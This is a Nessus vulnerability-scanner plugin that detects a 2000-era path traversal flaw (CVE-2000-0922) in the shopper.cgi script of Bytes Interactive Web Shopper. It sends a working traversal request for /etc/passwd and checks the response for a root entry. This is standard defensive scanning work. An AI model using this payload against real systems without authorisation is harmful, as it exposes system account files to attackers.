#
# This script was written by Thomas Reinke <reinke@e-softinc.com>
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title, OSVDB ref, output formatting, family change (9/5/09)


include("compat.inc");

if(description)
{
 script_id(10533);
 script_version ("$Revision: 1.27 $");
 script_cve_id("CVE-2000-0922");
 script_bugtraq_id(1776);
 script_osvdb_id(432);
 
 script_name(english:"Bytes Interactive Web Shopper shopper.cgi Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that is affected by an
information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host contains is running Byte's Interactive Web Shopper, a
shopping cart application. The installed version allows for retrieval
of arbitrary files from the web server." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6b0e526c" );
 script_set_attribute(attribute:"solution", value:
"Uncomment the '#$debug=1' variable in the scripts so that it will
check for and disallow viewing of aribtrary files." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");

 script_set_attribute(attribute:"plugin_publication_date", value: "2000/10/10");
 script_set_attribute(attribute:"vuln_publication_date", value: "2000/10/08");
 script_cvs_date("$Date: 2012/03/26 17:37:09 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english:"Web Shopper remote file retrieval");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2000-2012 Thomas Reinke");
 script_family(english:"CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 buf = string(dir, "/shopper.cgi?newpage=../../../../../../etc/passwd");
 buf = http_get(item:buf, port:port);
 rep = http_keepalive_send_recv(port:port, data:buf);
 if(rep == NULL)exit(0);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:rep))
  	security_warning(port);
}
